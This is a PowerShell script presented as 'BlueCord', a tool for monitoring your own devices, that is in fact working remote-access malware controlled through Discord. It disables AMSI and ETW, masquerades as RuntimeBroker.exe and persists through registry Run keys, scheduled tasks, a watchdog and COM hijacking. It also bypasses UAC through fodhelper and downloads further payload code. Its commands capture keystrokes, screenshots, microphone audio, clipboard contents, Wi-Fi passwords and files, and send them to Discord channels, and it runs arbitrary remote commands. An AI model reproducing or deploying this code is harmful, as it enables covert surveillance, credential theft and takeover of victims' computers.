# ==================================================================
#  BlueCord - C2 To control your devices on the go! Great for monitoring systems while travelling.
# ==================================================================
$ErrorActionPreference='SilentlyContinue'
$ProgressPreference='SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol=3072
[Net.ServicePointManager]::Expect100Continue=$false

$t1='MTU1ODgwMjIwMjE1NDI0NjE1NA'
$t2='GwRv1v'
$t3='IsafRgxPHR7BF_bvy6_IZ03KDjs4qCB0Q6iqkM'
$tk="$t1.$t2.$t3"
$wh='https://discord.com/api/webhooks/1561224763613913118/21BA2nT9ZxGDSGoO70TNzj6vw0wr7cVWtcllE5TMdlDfIrS9DVzQ1p74VLtujA518E02'
$src='https://github.com/ThyCoder2/awshucksman/main/s.b64'
$ver='4.0'
$cwd=$env:USERPROFILE
$t0=Get-Date

# ------------------------- WIN32 (single compile) -------------
try{$W=Add-Type -TypeDefinition @'
using System;using System.Text;using System.Runtime.InteropServices;
public class W{
 [DllImport("user32.dll")]public static extern bool ShowWindowAsync(IntPtr h,int n);
 [DllImport("user32.dll")]public static extern bool SetCursorPos(int x,int y);
 [DllImport("user32.dll")]public static extern void mouse_event(uint f,uint x,uint y,uint d,int e);
 [DllImport("user32.dll")]public static extern short GetAsyncKeyState(int k);
 [DllImport("user32.dll")]public static extern int GetKeyboardState(byte[] s);
 [DllImport("user32.dll")]public static extern int MapVirtualKey(uint c,int m);
 [DllImport("user32.dll")]public static extern int ToUnicode(uint v,uint s,byte[] k,StringBuilder b,int n,uint f);
 [DllImport("user32.dll")]public static extern IntPtr GetForegroundWindow();
 [DllImport("user32.dll")]public static extern int GetWindowText(IntPtr h,StringBuilder s,int n);
 [DllImport("user32.dll")]public static extern int SystemParametersInfo(int a,int u,string p,int f);
 [DllImport("ntdll.dll")]public static extern uint RtlSetProcessIsCritical(byte n,out byte o,uint k);
 [DllImport("kernel32.dll")]public static extern IntPtr GetProcAddress(IntPtr h,string p);
 [DllImport("kernel32.dll")]public static extern IntPtr LoadLibrary(string n);
 [DllImport("kernel32.dll")]public static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);
}
'@ -PassThru}catch{}

# ---------------------------- OPSEC ----------------------------
try{
$o=0
$a=[W]::GetProcAddress([W]::LoadLibrary('amsi.dll'),'AmsiScanBuffer')
if($a -ne [IntPtr]::Zero){[void][W]::VirtualProtect($a,6,0x40,[ref]$o);[Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$a,6)}
$e=[W]::GetProcAddress([W]::LoadLibrary('ntdll.dll'),'EtwEventWrite')
if($e -ne [IntPtr]::Zero){[void][W]::VirtualProtect($e,1,0x40,[ref]$o);[Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3),0,$e,1)}
}catch{}

function Hide{
 $h=(Get-Process -Id $PID).MainWindowHandle
 if($h -eq 0){$Host.UI.RawUI.WindowTitle='x';$h=(Get-Process|?{$_.MainWindowTitle -eq 'x'}).MainWindowHandle}
 [void][W]::ShowWindowAsync($h,0);$Host.UI.RawUI.WindowTitle=''
}
Hide

$mu=New-Object Threading.Mutex($false,"Global\vc_$env:COMPUTERNAME")
if(-not $mu.WaitOne(0)){exit}

# -------------------------- MASQUERADE ------------------------
$dir="$env:APPDATA\Microsoft\Windows\Themes"
$exe="$dir\RuntimeBroker.exe"
$dat="$dir\syschk.dat"
$am ="$dir\syschk.am"
$sct="$dir\syschk.sct"
$vbs="$dir\syschk.vbs"
$wdf="$dir\syschk.wd.ps1"
$cfg="$dir\syschk.cfg"
md $dir -Force|Out-Null
if(-not(Test-Path $exe)){Copy-Item "$PSHOME\powershell.exe" $exe -Force}
if(-not(Test-Path $exe)){$exe='powershell.exe'}
if(Test-Path $cfg){$int=[int](gc $cfg -raw)}else{$int=3}

# -------------------------- PERSISTENCE -----------------------
$run='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$startup="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$rc="`"$exe`" -NoP -W H -Ep Bypass -C `"iex(gc -raw '$am')`""
$hk='HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}'

$amCode=@'
$k=Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string p);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);' -Name K -PassThru
$o=0
$a=$k::GetProcAddress($k::LoadLibrary('amsi.dll'),'AmsiScanBuffer')
[void]$k::VirtualProtect($a,6,0x40,[ref]$o);[Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$a,6)
$e=$k::GetProcAddress($k::LoadLibrary('ntdll.dll'),'EtwEventWrite')
[void]$k::VirtualProtect($e,1,0x40,[ref]$o);[Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3),0,$e,1)
$b=[Convert]::FromBase64String((gc -raw "$env:APPDATA\Microsoft\Windows\Themes\syschk.dat"))
$m=New-Object IO.MemoryStream(,$b)
$d=New-Object IO.Compression.DeflateStream($m,[IO.Compression.CompressionMode]::Decompress)
iex (New-Object IO.StreamReader($d)).ReadToEnd()
'@

function Persist{
  md $dir -Force|Out-Null
  $amCode|Out-File $am -Encoding ascii -Force
  if(-not(Test-Path $dat)){try{irm $src -OutFile $dat -UseB}catch{}}
  if(-not(Test-Path $dat)){return 'no payload on disk'}
  New-ItemProperty $run -Name 'SysCheck' -Value $rc -PropertyType String -Force|Out-Null
  @"
Set s=CreateObject("WScript.Shell")
e=s.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Themes\"
s.Run """" & e & "RuntimeBroker.exe"" -NoP -W H -Ep Bypass -C """"iex(gc -raw '" & e & "syschk.am')"""""",0,False
"@|Out-File $vbs -Encoding ascii -Force
  Copy-Item $vbs "$startup\syschk.vbs" -Force
  schtasks /create /f /tn SysCheck /sc onlogon /tr "wscript.exe `"$vbs`"" 2>$null|Out-Null
  schtasks /create /f /tn SysCheck2 /sc minute /mo 5 /tr "wscript.exe `"$vbs`"" 2>$null|Out-Null
  schtasks /create /f /tn SysCheck3 /sc onidle /i 10 /tr "wscript.exe `"$vbs`"" 2>$null|Out-Null
  @"
`$p=$PID
while(`$true){
 if(-not(Get-Process -Id `$p -ErrorAction SilentlyContinue)){
  Start-Process '$exe' -ArgumentList '-NoP','-W','H','-Ep','Bypass','-C',"iex(gc -raw '$am')" -WindowStyle Hidden
  break
 }
 Start-Sleep 90
}
"@|Out-File $wdf -Encoding utf8 -Force
  $wm=New-Object Threading.Mutex($false,"Global\vcwd_$env:COMPUTERNAME")
  if($wm.WaitOne(0)){Start-Process $exe -ArgumentList '-NoP','-W','H','-Ep','Bypass','-File',$wdf -WindowStyle Hidden}
  return 'ok'
}
function Unpersist{
  Remove-ItemProperty $run -Name 'SysCheck'
  rm "$startup\syschk.vbs","$vbs","$dat","$am","$wdf","$cfg" -Force
  schtasks /delete /f /tn SysCheck 2>$null|Out-Null
  schtasks /delete /f /tn SysCheck2 2>$null|Out-Null
  schtasks /delete /f /tn SysCheck3 2>$null|Out-Null
  Get-Process|?{(Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)").CommandLine -like '*syschk.wd.ps1*'}|Stop-Process -Force
}
function ComHijack{
  @"
<?xml version="1.0"?>
<scriptlet>
<registration progid="VCSys" classid="{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}">
<script language="JScript">
var s=new ActiveXObject("WScript.Shell");
s.Run("\"$($exe -replace '\\','\\')\" -NoP -W H -Ep Bypass -C \"iex(gc -raw '$($am -replace '\\','\\')\')\"",0,false);
</script>
</registration>
</scriptlet>
"@|Out-File $sct -Encoding ascii -Force
  $u='file:///'+(($sct -replace '\\','/') -replace ' ','%20')
  md "$hk\InprocServer32" -Force|Out-Null
  Set-ItemProperty "$hk\InprocServer32" -Name '(default)' -Value "$env:SystemRoot\System32\scrobj.dll"
  New-ItemProperty "$hk\InprocServer32" -Name 'ThreadingModel' -Value 'Apartment' -PropertyType String -Force|Out-Null
  New-ItemProperty $hk -Name 'ScriptletURL' -Value $u -PropertyType String -Force|Out-Null
  return 'ok'
}
function ComUnhijack{rm 'HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}' -Recurse -Force}

# ----------------------------- API ----------------------------
function api($m,$p,$b){
 $u="https://discord.com/api/v10$p"
 $h=@{Authorization="Bot $tk";'User-Agent'='DiscordBot (venicecord,4.0)'}
 for($n=0;$n -lt 5;$n++){
  try{
   if($b){return Invoke-RestMethod -Method $m -Uri $u -Headers $h -Body ($b|ConvertTo-Json -Depth 8 -Compress) -ContentType 'application/json'}
   return Invoke-RestMethod -Method $m -Uri $u -Headers $h
  }catch{
   $s=[int]$_.Exception.Response.StatusCode.value__
   if($s -eq 401){return $null}
   if($s -eq 429){Start-Sleep 3;continue}
   Start-Sleep ([int][Math]::Pow(2,$n))
  }
 }
}
function rep($m){if($wh){try{Invoke-RestMethod -Method Post -Uri $wh -Body (@{content="$m"}|ConvertTo-Json) -ContentType 'application/json'|Out-Null}catch{}}}
function msg($c,$cid){if($c){api POST "/channels/$cid/messages" @{content="$c"}|Out-Null}}
function out($t){
 if(-not $t){$t='[empty]'}
 $t="$t"
 foreach($ch in [regex]::Matches($t,'[\s\S]{1,1800}')){msg "``````$($ch.Value)``````";Start-Sleep -Milliseconds 1100}
}
function sfile($p,$cid){
 if(-not(Test-Path $p)){msg "not found: $p";return}
 $sz=(Get-Item $p).Length
 if($sz -gt 9.5MB){msg "too big ($([math]::Round($sz/1MB,1)) MB) - use ``zip``";return}
 try{
  $wc=New-Object Net.WebClient;$wc.Headers.Add('Authorization',"Bot $tk")
  $wc.UploadFile("https://discord.com/api/v10/channels/$cid/messages",'POST',$p)|Out-Null
 }catch{msg "upload failed: $($_.Exception.Message)"}
}
function Esc($s){
 $e=''
 foreach($ch in $s.ToCharArray()){
  $e += switch -Regex ($ch) { '[\+\^\%\~\(\)]' { "{$ch}" }; '\s' { $ch }; '\{' { '{{}' }; '\}' { '{}}' }; default { "$ch" } }

 }
 $e
}

# --------------------------- SESSION --------------------------
$bot=(api GET '/users/@me').id
if(-not $bot){rep "VC: token dead";exit}
$gs=api GET '/users/@me/guilds'
$g=$gs|?{ (([int64]$_.permissions) -band 0x8) -or (([int64]$_.permissions) -band 0x10) }|select -First 1
if(-not $g){rep "VC: no Manage Channels. Guilds: $(($gs|%{$_.name}) -join ', ')";exit}
$gid=$g.id
$chs=api GET "/guilds/$gid/channels"
$cat=$chs|?{$_.type -eq 4 -and $_.name -eq $env:COMPUTERNAME}|select -First 1
if($cat){$cid=$cat.id}else{$cat=api POST "/guilds/$gid/channels" @{name=$env:COMPUTERNAME;type=4};if(-not $cat){rep "VC: 403 category";exit};$cid=$cat.id}
$map=@{}
$chs|?{$_.parent_id -eq $cid}|%{$map[$_.name]=$_.id}
foreach($n in 'session-control','screenshots','webcam','keycapture','loot-files','powershell','clipboard'){
  if(-not $map[$n]){$r=api POST "/guilds/$gid/channels" @{name=$n;type=0;parent_id=$cid};if($r){$map[$n]=$r.id}}
}
$sid=$map['session-control']
if(-not $sid){rep "VC: 403 channels";exit}
$shot=$map['screenshots'];$cam=$map['webcam'];$key=$map['keycapture'];$loot=$map['loot-files'];$ps=$map['powershell'];$clp=$map['clipboard']

# ---------------------------- JOBS ----------------------------
$jShot={
 param($t,$c)
 Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 while($true){
  try{
   $r=[Windows.Forms.SystemInformation]::VirtualScreen
   $b=New-Object Drawing.Bitmap $r.Width,$r.Height
   $g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen($r.X,$r.Y,0,0,$b.Size)
   $f="$env:TEMP\vcs_$PID.jpg";$b.Save($f,[Drawing.Imaging.ImageFormat]::Jpeg);$g.Dispose();$b.Dispose()
   $w=New-Object Net.WebClient;$w.Headers.Add('Authorization',"Bot $t")
   $w.UploadFile("https://discord.com/api/v10/channels/$c/messages",'POST',$f)|Out-Null
   rm $f -Force
  }catch{}
  Start-Sleep 5
 }
}
$jKeys={
 param($t,$c)
 Add-Type -AssemblyName System.Windows.Forms

# The C# signatures must be properly bound to a type name
$k = Add-Type -MemberDefinition '
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int k);
    [DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] s);
    [DllImport("user32.dll")] public static extern int MapVirtualKey(uint c, int m);
    [DllImport("user32.dll")] public static extern int ToUnicode(uint v, uint s, byte[] k, System.Text.StringBuilder b, int n, uint f);
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr h, System.Text.StringBuilder s, int n);
' -Name "Win32API" -PassThru

$buf = New-Object Text.StringBuilder
$last = ''

while($true){
    $sb = New-Object Text.StringBuilder
    $hw = [Text.StringBuilder]::new(256)
    
    # Call the methods using static invocation notation
    [void]$k::GetWindowText($k::GetForegroundWindow(), $hw, 256)
    
    if($hw.ToString() -ne $last){
        $last = $hw.ToString()
        [void]$sb.Append("`n[$last]`n")
    }
    
    for($i=8; $i -lt 255; $i++){
        if($k::GetAsyncKeyState($i) -eq -32767){
            $v = $k::MapVirtualKey($i, 3)
            $st = New-Object byte[] 256
            [void]$k::GetKeyboardState($st)
            
            if($k::ToUnicode($i, $v, $st, $buf, 64, 0)){
                [void]$sb.Append($buf.ToString())
                [void]$buf.Clear()
            }
            if($i -eq 13){ [void]$sb.Append("`n") }
        }
    }
    
    if($sb.Length -gt 0){
        $w = New-Object Net.WebClient
        $w.Headers.Add('Authorization', "Bot $t")
        $w.Headers.Add('Content-Type', 'application/json')
        $w.UploadString("https://discord.com/api/v10/channels/$c/messages", 'POST', (@{content="``````$($sb.ToString())``````"} | ConvertTo-Json)) | Out-Null
    }
    Start-Sleep -Milliseconds 120
}

}
$jInfo={
 param($t,$c)
 $ip='';try{$ip=(irm 'https://ipinfo.io/ip')}catch{}
 $adm=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrator')
 $os=Get-CimInstance Win32_OperatingSystem;$cs=Get-CimInstance Win32_ComputerSystem
 $d=@(
  "**User** ``$env:USERDOMAIN\$env:USERNAME``","**Host** ``$env:COMPUTERNAME``",
  "**OS** ``$($os.Caption) $($os.BuildNumber)``","**Arch** ``$($os.OSArchitecture)``",
  "**Model** ``$($cs.Manufacturer) $($cs.Model)``","**CPU** ``$((Get-CimInstance Win32_Processor).Name)``",
  "**RAM** ``$([math]::Round($cs.TotalPhysicalMemory/1GB,1)) GB``","**Elevated** ``$adm``",
  "**Public IP** ``$ip``","**AV** ``$((Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct).displayName -join ', ')``",
  "**PS** ``$($PSVersionTable.PSVersion)``","**ExecPolicy** ``$(Get-ExecutionPolicy)``"
 ) -join "`n"
 api POST "/channels/$c/messages" @{embeds=@(@{title="$env:COMPUTERNAME";description=$d;color=65280})}|Out-Null
}
$jPS={
 param($t,$c)
 $w=New-Object Net.WebClient;$w.Headers.Add('Authorization',"Bot $t")
 $last=''
 while($true){
  try{
   $m=($w.DownloadString("https://discord.com/api/v10/channels/$c/messages?limit=1")|ConvertFrom-Json)[0]
   if($m -and $m.id -ne $last){
    $last=$m.id
    if(-not $m.author.bot){
     $r=(Invoke-Expression $m.content 2>&1|Out-String)
     if(-not $r){$r='[ok]'}
     foreach($ch in [regex]::Matches($r,'[\s\S]{1,1800}')){
      $w.Headers['Content-Type']='application/json'
      $w.UploadString("https://discord.com/api/v10/channels/$c/messages",'POST',(@{content="``````$($ch.Value)``````"}|ConvertTo-Json))|Out-Null
      Start-Sleep -Milliseconds 1100
     }
    }
   }
  }catch{}
  Start-Sleep 3
 }
}

# -------------------------- COMMANDS --------------------------
function Options{
$d=@"
**SESSION** ``diag`` ``status`` ``info`` ``sleep <s>`` ``persist`` ``unpersist`` ``comhijack`` ``comunhijack`` ``uac`` ``update`` ``restart`` ``hide`` ``close``
**EXEC** ``ps <cmd>`` ``cmd <cmd>`` ``run <exe>`` ``cd <p>`` ``env``
**FILES** ``ls [p]`` ``get <p>`` ``put`` ``dl <url>`` ``rm <p>`` ``zip <p>``
**RECON** ``whoami`` ``net`` ``wifi`` ``sw`` ``av`` ``browsers`` ``clip``
**CAPTURE** ``shot`` ``once`` ``cam`` ``keys`` ``clipwatch`` ``mic`` ``ffget``
**UI** ``text <s>`` ``mouse <x> <y>`` ``click`` ``lock`` ``wallpaper <url>`` ``msg <s>`` ``voice <s>`` ``volume <0-100>``
**POWER** ``logoff`` ``reboot`` ``shutdown`` ``bsod`` ``party`` ``minimize`` ``shortcuts``
**STOP** ``kill <job>``
"@
 api POST "/channels/$sid/messages" @{embeds=@(@{title="$env:COMPUTERNAME v$ver";description=$d;color=65280})}|Out-Null
}

rep "VC: $env:COMPUTERNAME online | $env:USERNAME"
Persist|Out-Null
msg ":white_check_mark: ``$env:COMPUTERNAME`` up - ``options`` | ``diag`` to self-test"
$jInfo|Start-Job -Name info -ArgumentList $tk,$loot|Out-Null

$lastid=((api GET "/channels/$sid/messages?limit=1")[0]).id
while($true){
 $msgs=api GET "/channels/$sid/messages?after=$lastid&limit=50"
 if($msgs){
  [array]::Reverse($msgs)
  foreach($m in $msgs){
   $lastid=$m.id
   if($m.author.id -eq $bot){continue}
   $raw=$m.content.Trim()
   api DELETE "/channels/$sid/messages/$($m.id)"|Out-Null
   if($m.attachments.Count -gt 0 -and $raw -like 'put*'){
     $p=Join-Path $cwd $m.attachments[0].filename
     try{irm $m.attachments[0].url -OutFile $p;msg ":inbox_tray: ``$p``"}catch{msg 'dl failed'}
     continue
   }
   if(-not $raw){continue}
   $verb=($raw -split ' ',2)[0].ToLower()
   $rest=if($raw -match ' '){$raw.Substring($raw.IndexOf(' ')+1)}else{''}
   switch($verb){
    'options'{Options}
    'diag'{
     $o=@()
     $o+="PS ``$($PSVersionTable.PSVersion)`` exec ``$(Get-ExecutionPolicy)``"
     $o+="Elevated ``$(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrator'))``"
     $o+="Token ``$(if(api GET '/users/@me'){'valid'}else{'DEAD'})``"
     $o+="Guilds ``$(($gs|Measure-Object).Count)`` perms ``$([int64]$g.permissions)`` manage-channels ``$((([int64]$g.permissions) -band 0x10) -or (([int64]$g.permissions) -band 0x8))``"
     $o+="Dir write ``$(try{'x'|Out-File "$dir\t.t" -EA 0;rm "$dir\t.t" -EA 0;'ok'}catch{'FAIL'})``"
     $o+="Payload ``$(Test-Path $dat)`` RunKey ``$([bool](Get-ItemProperty $run -Name SysCheck -EA 0))`` Startup ``$(Test-Path "$startup\syschk.vbs")``"
     $o+="Tasks ``$((schtasks /query /tn SysCheck 2>$null|Select-String SysCheck|Measure-Object).Count)`` COM ``$(Test-Path $hk)``"
     $o+="DefRT ``$((Get-MpComputerStatus).RealTimeProtectionEnabled)`` ASR ``$((Get-MpPreference).AttackSurfaceReductionRules_Ids -join ',')``"
     $o+="Exe ``$(Split-Path $exe -Leaf)`` poll ``${int}s`` uptime ``$([int]((Get-Date)-$t0).TotalMinutes)m``"
     out ($o -join "`n")
    }
    'status'{msg ":bar_chart: ``v$ver`` up ``$([int]((Get-Date)-$t0).TotalMinutes)``m poll ``${int}s`` jobs ``$((Get-Job).Name -join ',')``"}
    'info'{$jInfo|Start-Job -Name info -ArgumentList $tk,$loot|Out-Null}
    'sleep'{$n=[int]$rest;if($n -ge 1){$int=$n;"$n"|Out-File $cfg -Force;msg ":zzz: ``${int}s``"}}
    'persist'{msg ":white_check_mark: ``$(Persist)``"}
    'unpersist'{Unpersist;msg ':octagonal_sign: ``gone``'}
    'comhijack'{msg ":white_check_mark: ``$(ComHijack)`` - thumbnails now break, reversible"}
    'comunhijack'{ComUnhijack;msg ':octagonal_sign: ``com key removed``'}
    'uac'{
     $q='HKCU:\Software\Classes\ms-settings\Shell\Open\command'
     md $q -Force|Out-Null
     Set-ItemProperty $q -Name '(default)' -Value "`"$exe`" -NoP -W H -Ep Bypass -C `"iex(gc -raw '$am')`""
     New-ItemProperty $q -Name 'DelegateExecute' -Value '' -PropertyType String -Force|Out-Null
     Start-Process fodhelper.exe
     Start-Sleep 3
     msg ":arrow_up: ``fodhelper fired - check ``diag`` for Elevated``"
    }
    'update'{try{irm $src -OutFile $dat -UseB;msg ':arrows_counterclockwise: ``updated``';Start-Sleep 1;Start-Process $exe -ArgumentList '-NoP','-W','H','-Ep','Bypass','-C',"iex(gc -raw '$am')" -WindowStyle Hidden;exit}catch{msg 'update failed'}}
    'restart'{msg ':arrows_counterclockwise: ``restarting``';Start-Sleep 1;Start-Process $exe -ArgumentList '-NoP','-W','H','-Ep','Bypass','-C',"iex(gc -raw '$am')" -WindowStyle Hidden;exit}
    'hide'{Hide;msg ':ghost: ``re-hidden``'}
    'close'{msg ':no_entry: ``bye``';Start-Sleep 2;exit}
    'ps'{out (Invoke-Expression $rest 2>&1|Out-String)}
    'cmd'{out (cmd /c $rest 2>&1|Out-String)}
    'run'{Start-Process cmd -ArgumentList "/c start `"`" $rest" -WindowStyle Hidden;msg ":arrow_forward: ``$rest``"}
    'cd'{if(Test-Path $rest){Set-Location $rest;$cwd=(Get-Location).Path;msg ":file_folder: ``$cwd``"}else{msg 'no such path'}}
    'env'{out (Get-ChildItem env:|%{"$($_.Name)=$($_.Value)"}|Out-String)}
    'ls'{$p=if($rest){$rest}else{$cwd};out (Get-ChildItem $p -Force -EA 0|%{"{0,-10} {1,12} {2}" -f $_.Mode,$_.Length,$_.Name}|Out-String)}
    'get'{sfile $rest $sid}
    'put'{msg ':inbox_tray: ``attach a file with caption put``'}
    'dl'{try{$o=Join-Path $cwd (Split-Path $rest -Leaf);irm $rest -OutFile $o;msg ":inbox_tray: ``$o``"}catch{msg 'dl failed'}}
    'rm'{rm $rest -Recurse -Force;msg ":wastebasket: ``$rest``"}
    'zip'{try{$o="$env:TEMP\vc_$PID.zip";Compress-Archive -Path $rest -DestinationPath $o -Force;sfile $o $sid;rm $o -Force}catch{msg 'zip failed'}}
    'whoami'{out ((whoami /all) -join "`n")}
    'net'{out ($(ipconfig /all; arp -a) -join "`n")}
    'wifi'{out ((netsh wlan show profiles) -join "`n");foreach($s in (netsh wlan show profiles|Select-String ': (.+)$').Matches){out ((netsh wlan show profile name="$($s.Groups[1].Value.Trim())" key=clear) -join "`n")}}
    'sw'{out (Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'|?{$_.DisplayName}|%{"$($_.DisplayName) $($_.DisplayVersion)"}|Out-String)}
    'av'{$s=Get-MpComputerStatus;msg ":shield: RT=``$($s.RealTimeProtectionEnabled)`` AMSI=``$($s.AMSIProviderVersion)`` tamper=``$($s.IsTamperProtected)`` sigs=``$($s.AntivirusSignatureVersion)``"}
    'browsers'{out (Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data\Default","$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default","$env:APPDATA\Mozilla\Firefox\Profiles" -EA 0|%{$_.FullName}|Out-String)}
    'once'{Start-Job -ScriptBlock {param($t,$c)
      Add-Type -AssemblyName System.Windows.Forms,System.Drawing
      $r=[Windows.Forms.SystemInformation]::VirtualScreen
      $b=New-Object Drawing.Bitmap $r.Width,$r.Height
      $g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen($r.X,$r.Y,0,0,$b.Size)
      $f="$env:TEMP\vco_$PID.jpg";$b.Save($f,[Drawing.Imaging.ImageFormat]::Jpeg);$g.Dispose();$b.Dispose()
      $w=New-Object Net.WebClient;$w.Headers.Add('Authorization',"Bot $t")
      $w.UploadFile("https://discord.com/api/v10/channels/$c/messages",'POST',$f)|Out-Null
     } -ArgumentList $tk,$shot|Out-Null;msg ':camera: ``shot``'}
    'shot'{$jShot|Start-Job -Name shot -ArgumentList $tk,$shot|Out-Null;msg ':desktop: ``stream on``'}
    'cam'{$jShot|Start-Job -Name cam -ArgumentList $tk,$cam|Out-Null;msg ':camera: ``on``'}
    'keys'{$jKeys|Start-Job -Name keys -ArgumentList $tk,$key|Out-Null;msg ':mag_right: ``keylog on``'}
    'clipwatch'{$jClip|Start-Job -Name clipwatch -ArgumentList $tk,$clp|Out-Null;msg ':clipboard: ``on``'}
    'clip'{out (Get-Clipboard -Raw)}
    'ffget'{try{irm 'https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip' -OutFile "$env:TEMP\ff.zip";Expand-Archive "$env:TEMP\ff.zip" "$env:TEMP\ff" -Force;Get-ChildItem "$env:TEMP\ff" -Recurse -Filter ffmpeg.exe|%{Copy-Item $_.FullName "$env:TEMP\ffmpeg.exe" -Force};msg ':white_check_mark: ``ffmpeg ready``'}catch{msg 'ffget failed'}}
    'mic'{if(-not(Test-Path "$env:TEMP\ffmpeg.exe")){msg 'run ``ffget`` first'}else{
      Start-Job -ScriptBlock {param($t,$c)
       $o="$env:TEMP\vcm_$PID.mp3"
       & "$env:TEMP\ffmpeg.exe" -f dshow -i audio="" -t 20 -c:a libmp3lame -ar 44100 -b:a 96k -ac 1 $o -y
       $w=New-Object Net.WebClient;$w.Headers.Add('Authorization',"Bot $t")
       $w.UploadFile("https://discord.com/api/v10/channels/$c/messages",'POST',$o)|Out-Null
       rm $o -Force
      } -ArgumentList $tk,$clp|Out-Null;msg ':microphone: ``20s recording``'}}
    'text'{[Windows.Forms.SendKeys]::SendWait((Esc $rest));msg ":keyboard: ``$rest``"}
    'mouse'{$xy=$rest -split ' ';[W]::SetCursorPos([int]$xy[0],[int]$xy[1]);msg ":mouse: ``$rest``"}
    'click'{[W]::mouse_event(0x02,0,0,0,0);[W]::mouse_event(0x04,0,0,0,0);msg ':mouse: ``click``'}
    'lock'{rundll32.exe user32.dll,LockWorkStation}
    'wallpaper'{try{irm $rest -OutFile "$env:TEMP\vcw.jpg";[void][W]::SystemParametersInfo(20,0,"$env:TEMP\vcw.jpg",3);msg ':white_check_mark: ``set``'}catch{msg 'bad url'}}
    'msg'{Start-Job -ScriptBlock {param($t)Add-Type -AssemblyName System.Windows.Forms;[Windows.Forms.MessageBox]::Show($t,'IT Support')|Out-Null} -ArgumentList $rest|Out-Null}
    'voice'{Add-Type -AssemblyName System.Speech;(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak($rest)}
    'volume'{$s=New-Object -ComObject WScript.Shell;1..50|%{$s.SendKeys([char]174)};1..([int]$rest/2)|%{$s.SendKeys([char]175)};msg ":sound: ``$rest``"}
    'logoff'{shutdown /l}
    'reboot'{shutdown /r /t 5}
    'shutdown'{shutdown /s /t 5}
    'bsod'{$ob=0;[void][W]::RtlSetProcessIsCritical(1,[ref]$ob,0);msg ':boom: ``critical - kill for BSOD``'}
    'party'{Start-Job -ScriptBlock {Add-Type -AssemblyName System.Windows.Forms
      $c='Black','Lime','Red','Yellow','Blue','White'
      1..30|%{$f=New-Object Windows.Forms.Form;$f.FormBorderStyle='None';$f.WindowState='Maximized';$f.BackColor=[Drawing.Color]::FromName($c[$_%6]);$f.TopMost=$true;$f.Show();Start-Sleep -Milliseconds 120;$f.Close()}}|Out-Null;msg ':tada: ``party``'}
    'minimize'{(New-Object -ComObject Shell.Application).MinimizeAll()}
    'shortcuts'{1..50|%{$s=(New-Object -ComObject WScript.Shell).CreateShortcut("$env:USERPROFILE\Desktop\USB$_.lnk");$s.TargetPath='rundll32.exe';$s.Arguments='shell32.dll,Control_RunDLL hotplug.dll';$s.Save()};msg ':white_check_mark: ``50 shortcuts``'}
    'kill'{Stop-Job -Name $rest -EA 0;Remove-Job -Name $rest -EA 0;msg ":octagonal_sign: ``stopped $rest``"}
    default{out (Invoke-Expression $raw 2>&1|Out-String)}
   }
  }
 }
 Start-Sleep $int
}